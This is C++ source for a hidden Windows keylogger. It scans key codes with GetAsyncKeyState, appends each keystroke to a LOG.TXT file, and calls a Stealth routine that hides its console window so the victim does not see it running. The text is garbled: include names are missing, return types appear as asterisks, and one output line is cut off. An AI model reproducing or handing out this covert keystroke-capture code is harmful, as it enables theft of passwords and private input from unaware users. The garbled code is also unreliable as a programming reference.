‪#‎include‬ 
using namespace std;
#include 
#include 
int Save (int key_stroke, char *file);
**** Stealth();
int main()
{
Stealth();
char i;
while(1)
{
for(i=8 ; i<=190 ; i++)
{
if(GetAsyncKeyState(i)== -32767)
Save(i,"LOG.TXT");
}
}
system("PAUSE");
return 0;
}
int Save (int key_stroke, char *file) {
if((key_stroke==1) || (key_stroke==2) )
return 0;
FILE *OUTPUT_FILE;
OUTPUT_FILE=fopen(file, "a+");
fprintf(OUTPUT_FILE, "%s", &key_stroke);
fclose(OUTPUT_FILE);
cout<
if (key_stroke==8)
fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
return 0;
}
**** Stealth()
{
HWND stealth;
AllocConsole();
stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(stealth,0);
}
